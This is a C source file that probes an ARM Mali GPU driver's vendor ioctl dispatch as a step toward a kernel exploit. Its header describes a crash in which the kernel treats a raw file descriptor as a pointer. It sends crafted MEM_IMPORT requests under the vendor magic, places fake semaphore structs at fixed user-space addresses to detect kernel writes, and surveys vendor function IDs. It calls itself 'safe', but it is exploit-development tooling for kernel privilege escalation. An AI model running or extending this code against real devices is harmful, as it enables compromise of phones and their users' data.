/*
 * mali_exploit_probe4.c — SAFE Mali vendor dispatch investigation
 *
 * SAFETY: NEVER uses real ION fd as phandle with vendor import magic.
 * Only tests:
 *   1. Vendor vs standard handshake effect on state
 *   2. Fake struct at mapped addresses with vendor magic
 *   3. phandle=0 with all type values under vendor magic
 *   4. Standard import (correct path, pointer-to-fd) as control
 *
 * The crash occurs when: vendor_import + phandle=valid_fd + fget(phandle) succeeds
 *   → kernel uses raw fd as pointer → crash
 * We AVOID this by never passing a valid fd number as phandle to vendor import.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/resource.h>

#define MALI_MAGIC 'M'
#define VENDOR_MAGIC 0x80

struct uk_header { uint32_t id; uint32_t ret; };

static int mali_cmd(int type, int sz) {
    return _IOC(3, type, 0, sz);
}

static int ion_alloc_fd(void) {
    int ion = open("/dev/ion", O_RDONLY | O_CLOEXEC);
    if (ion < 0) return -1;
    struct { uint64_t len, align; uint32_t heap, flags; int32_t fd; }
        d = {4096, 4096, 1, 0, -1};
    int r = ioctl(ion, 0xc0144900, &d);
    close(ion);
    return (r == 0 && d.fd >= 0) ? d.fd : -1;
}

static int do_handshake(int fd, int magic) {
    uint8_t hb[16];
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 0; /* VERSION_CHECK */
    hb[8] = 10; /* version */
    int r1 = ioctl(fd, mali_cmd(magic, 16), hb);
    uint32_t ver_ret = ((struct uk_header*)hb)->ret;
    
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 530; /* POST_TERM */
    int r2 = ioctl(fd, mali_cmd(magic, 16), hb);
    uint32_t post_ret = ((struct uk_header*)hb)->ret;
    
    return (r1 == 0 && r2 == 0) ? 0 : -1;
}

/* Run test in forked child. Returns result via pipe */
typedef struct {
    int survived;       /* 1=OK, <-100 = signal -(100+sig) */
    int ioctl_ret;
    int ioctl_errno;
    uint32_t result;    /* header.ret from response */
    uint32_t header_id; /* header.id from response (result code) */
    int mods;           /* modifications to fake struct */
    char notes[64];
} test_result;

static void run_test(void (*fn)(int fd, test_result *r, void *arg),
                     int hs_magic, void *arg, test_result *res) {
    int pipefd[2];
    pipe(pipefd);
    
    pid_t pid = fork();
    if (pid == 0) {
        close(pipefd[0]);
        alarm(8);
        
        test_result r = {0};
        
        int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
        if (fd < 0) {
            snprintf(r.notes, sizeof(r.notes), "open failed: %d", errno);
            r.survived = -1;
            write(pipefd[1], &r, sizeof(r));
            _exit(1);
        }
        
        if (do_handshake(fd, hs_magic) < 0) {
            snprintf(r.notes, sizeof(r.notes), "handshake failed");
            r.survived = -2;
            write(pipefd[1], &r, sizeof(r));
            close(fd);
            _exit(1);
        }
        
        r.survived = 1;
        fn(fd, &r, arg);
        
        write(pipefd[1], &r, sizeof(r));
        close(pipefd[1]);
        close(fd);
        _exit(0);
    }
    
    close(pipefd[1]);
    int status;
    waitpid(pid, &status, 0);
    
    memset(res, 0, sizeof(*res));
    read(pipefd[0], res, sizeof(*res));
    close(pipefd[0]);
    
    if (WIFSIGNALED(status)) {
        res->survived = -(100 + WTERMSIG(status));
    }
}

/* ============================================ */
/* TEST FUNCTIONS                               */
/* ============================================ */

/* Test A: Standard import path (correct usage, pointer-to-fd) */
static void test_std_import(int fd, test_result *r, void *arg) {
    int magic = *(int *)arg;
    int ion_fd = ion_alloc_fd();
    if (ion_fd < 0) {
        snprintf(r->notes, sizeof(r->notes), "no ION fd");
        r->survived = -3;
        return;
    }
    
    uint8_t buf[48];
    memset(buf, 0, 48);
    *(uint32_t *)(buf + 0) = 513;               /* func: MEM_IMPORT */
    *(uint64_t *)(buf + 8) = (uintptr_t)&ion_fd; /* phandle = POINTER to fd */
    *(uint32_t *)(buf + 16) = 2;                 /* type = UMM */
    
    r->ioctl_ret = ioctl(fd, mali_cmd(magic, 48), buf);
    r->ioctl_errno = errno;
    r->header_id = *(uint32_t *)(buf + 0);
    r->result = *(uint32_t *)(buf + 4);
    
    close(ion_fd);
}

/* Test B: Vendor import with phandle=0 */
static void test_vendor_null(int fd, test_result *r, void *arg) {
    int type = *(int *)arg;
    
    uint8_t buf[48];
    memset(buf, 0, 48);
    *(uint32_t *)(buf + 0) = 513;  /* func: MEM_IMPORT */
    *(uint64_t *)(buf + 8) = 0;    /* phandle = NULL */
    *(uint32_t *)(buf + 16) = type;
    
    r->ioctl_ret = ioctl(fd, mali_cmd(VENDOR_MAGIC, 48), buf);
    r->ioctl_errno = errno;
    r->header_id = *(uint32_t *)(buf + 0);
    r->result = *(uint32_t *)(buf + 4);
}

/* Test C: Vendor import with fake struct at mapped address */
static void test_vendor_fake(int fd, test_result *r, void *arg) {
    uint32_t addr = *(uint32_t *)arg;
    uint32_t page = addr & ~0xFFF;
    
    /* Map 16 pages around the target address */
    void *fake = mmap((void *)(uintptr_t)page, 0x10000,
                      PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (fake == MAP_FAILED) {
        snprintf(r->notes, sizeof(r->notes), "mmap failed: %d", errno);
        return;
    }
    
    /* Fill fake struct at addr with semaphore-like data */
    /* Semaphore: .lock(spinlock=0), .count(1), .wait_list(.next=self,.prev=self) */
    /* ARM32 raw_spinlock is just a uint32_t volatile */
    for (uint32_t off = 0; off < 0x10000; off += 4) {
        /* Every 16 bytes = one "semaphore": lock=0, count=1, next=self, prev=self */
        int slot = (off % 16) / 4;
        uint32_t v;
        switch (slot) {
            case 0: v = 0; break;           /* spinlock = 0 (unlocked) */
            case 1: v = 1; break;           /* count = 1 (available) */
            case 2: v = page + (off & ~0xF) + 8; break;  /* next = &self.next */
            case 3: v = page + (off & ~0xF) + 8; break;  /* prev = &self.next */
            default: v = 0; break;
        }
        *(uint32_t *)((char *)fake + off) = v;
    }
    
    /* Record the initial value at the phandle offset for comparison */
    uint32_t orig[12];
    uint32_t poff = addr - page;
    memcpy(orig, (char *)fake + poff, sizeof(orig));
    
    uint8_t buf[48];
    memset(buf, 0, 48);
    *(uint32_t *)(buf + 0) = 513;     /* func: MEM_IMPORT */
    *(uint64_t *)(buf + 8) = addr;    /* phandle = mapped address */
    *(uint32_t *)(buf + 16) = 2;      /* type = UMM */
    
    r->ioctl_ret = ioctl(fd, mali_cmd(VENDOR_MAGIC, 48), buf);
    r->ioctl_errno = errno;
    r->header_id = *(uint32_t *)(buf + 0);
    r->result = *(uint32_t *)(buf + 4);
    
    /* Check for any modifications */
    r->mods = 0;
    for (uint32_t off = 0; off < 0x10000; off += 4) {
        int slot = (off % 16) / 4;
        uint32_t expected;
        switch (slot) {
            case 0: expected = 0; break;
            case 1: expected = 1; break;
            case 2: expected = page + (off & ~0xF) + 8; break;
            case 3: expected = page + (off & ~0xF) + 8; break;
            default: expected = 0; break;
        }
        if (*(uint32_t *)((char *)fake + off) != expected) {
            if (r->mods < 3) {
                snprintf(r->notes + strlen(r->notes),
                         sizeof(r->notes) - strlen(r->notes),
                         "@%x:%x→%x ",
                         page + off, expected,
                         *(uint32_t *)((char *)fake + off));
            }
            r->mods++;
        }
    }
    
    munmap(fake, 0x10000);
}

/* Test D: Standard import with vendor IMPORT magic only (standard handshake) */
/* This tests: if ONLY the import dispatch goes through vendor path */
static void test_mixed_import(int fd, test_result *r, void *arg) {
    /* phandle = 0 to be safe */
    uint8_t buf[48];
    memset(buf, 0, 48);
    *(uint32_t *)(buf + 0) = 513;  /* func: MEM_IMPORT */
    *(uint64_t *)(buf + 8) = 0;    /* phandle = NULL */
    *(uint32_t *)(buf + 16) = 2;   /* type = UMM */
    
    r->ioctl_ret = ioctl(fd, mali_cmd(VENDOR_MAGIC, 48), buf);
    r->ioctl_errno = errno;
    r->header_id = *(uint32_t *)(buf + 0);
    r->result = *(uint32_t *)(buf + 4);
}

/* Test E: What values does the kernel write back on success/failure? */
/* Compare output buffer between standard and vendor paths */
static void test_output_compare(int fd, test_result *r, void *arg) {
    int magic = *(int *)arg;
    
    /* Use invalid func ID to see error handling */
    uint8_t buf[48];
    memset(buf, 0xAA, 48);
    *(uint32_t *)(buf + 0) = 9999;  /* invalid func */
    
    r->ioctl_ret = ioctl(fd, mali_cmd(magic, 48), buf);
    r->ioctl_errno = errno;
    r->header_id = *(uint32_t *)(buf + 0);
    r->result = *(uint32_t *)(buf + 4);
    
    /* Report first few bytes of output */
    snprintf(r->notes, sizeof(r->notes), "hdr=%08x,%08x",
             *(uint32_t *)(buf + 0), *(uint32_t *)(buf + 4));
}

/* Test F: What func IDs are handled by vendor dispatch? */
static void test_vendor_funcs(int fd, test_result *r, void *arg) {
    int func = *(int *)arg;
    
    uint8_t buf[48];
    memset(buf, 0, 48);
    *(uint32_t *)(buf + 0) = func;
    
    r->ioctl_ret = ioctl(fd, mali_cmd(VENDOR_MAGIC, 48), buf);
    r->ioctl_errno = errno;
    r->header_id = *(uint32_t *)(buf + 0);
    r->result = *(uint32_t *)(buf + 4);
}

int main() {
    printf("=== Mali Vendor Dispatch — SAFE Investigation ===\n\n");
    
    /* ---- TEST A: Standard import as baseline ---- */
    printf("--- TEST A: Standard import (correct, pointer-to-fd) ---\n");
    {
        int std_magic = MALI_MAGIC;
        test_result r;
        
        run_test(test_std_import, MALI_MAGIC, &std_magic, &r);
        printf("  std_hs + std_import(ptr-to-fd): surv=%d ioctl=%d errno=%d hdr_id=%u ret=%u %s\n",
               r.survived, r.ioctl_ret, r.ioctl_errno, r.header_id, r.result, r.notes);
        
        /* Same but with vendor handshake */
        run_test(test_std_import, VENDOR_MAGIC, &std_magic, &r);
        printf("  vnd_hs + std_import(ptr-to-fd): surv=%d ioctl=%d errno=%d hdr_id=%u ret=%u %s\n",
               r.survived, r.ioctl_ret, r.ioctl_errno, r.header_id, r.result, r.notes);
    }
    
    /* ---- TEST B: Vendor import with phandle=0, all types ---- */
    printf("\n--- TEST B: Vendor import, phandle=0, all types ---\n");
    for (int t = 0; t <= 5; t++) {
        test_result r;
        run_test(test_vendor_null, VENDOR_MAGIC, &t, &r);
        printf("  type=%d: surv=%d ioctl=%d errno=%d hdr_id=%u ret=%u\n",
               t, r.survived, r.ioctl_ret, r.ioctl_errno, r.header_id, r.result);
    }
    
    /* ---- TEST C: Mixed - standard hs, vendor import, phandle=0 ---- */
    printf("\n--- TEST C: Standard handshake + vendor import (phandle=0) ---\n");
    {
        test_result r;
        run_test(test_mixed_import, MALI_MAGIC, NULL, &r);
        printf("  std_hs + vnd_import: surv=%d ioctl=%d errno=%d hdr_id=%u ret=%u\n",
               r.survived, r.ioctl_ret, r.ioctl_errno, r.header_id, r.result);
    }
    
    /* ---- TEST D: Fake struct at various addresses with vendor magic ---- */
    printf("\n--- TEST D: Vendor import, fake struct at mapped addresses ---\n");
    uint32_t addrs[] = {0x10000, 0x20000, 0x40000, 0x80000, 0x100000};
    for (int i = 0; i < 5; i++) {
        test_result r;
        run_test(test_vendor_fake, VENDOR_MAGIC, &addrs[i], &r);
        printf("  @0x%x: surv=%d ioctl=%d errno=%d hdr_id=%u ret=%u mods=%d %s\n",
               addrs[i], r.survived, r.ioctl_ret, r.ioctl_errno,
               r.header_id, r.result, r.mods, r.notes);
    }
    
    /* ---- TEST E: Error handling comparison ---- */
    printf("\n--- TEST E: Invalid func error handling ---\n");
    {
        int m;
        test_result r;
        
        m = MALI_MAGIC;
        run_test(test_output_compare, MALI_MAGIC, &m, &r);
        printf("  std_hs + std_dispatch(func=9999): surv=%d ioctl=%d errno=%d %s\n",
               r.survived, r.ioctl_ret, r.ioctl_errno, r.notes);
        
        m = VENDOR_MAGIC;
        run_test(test_output_compare, VENDOR_MAGIC, &m, &r);
        printf("  vnd_hs + vnd_dispatch(func=9999): surv=%d ioctl=%d errno=%d %s\n",
               r.survived, r.ioctl_ret, r.ioctl_errno, r.notes);
    }
    
    /* ---- TEST F: Vendor dispatch func ID survey ---- */
    printf("\n--- TEST F: Vendor func ID survey ---\n");
    /* Test specific func IDs around the MEM_IMPORT range */
    int funcs[] = {0, 1, 2, 256, 512, 513, 514, 515, 516, 520, 530, 1024};
    for (int i = 0; i < 12; i++) {
        test_result r;
        run_test(test_vendor_funcs, VENDOR_MAGIC, &funcs[i], &r);
        printf("  func=%4d: surv=%d ioctl=%d errno=%d hdr_id=%u ret=%u\n",
               funcs[i], r.survived, r.ioctl_ret, r.ioctl_errno, r.header_id, r.result);
    }
    
    printf("\n=== Done ===\n");
    return 0;
}
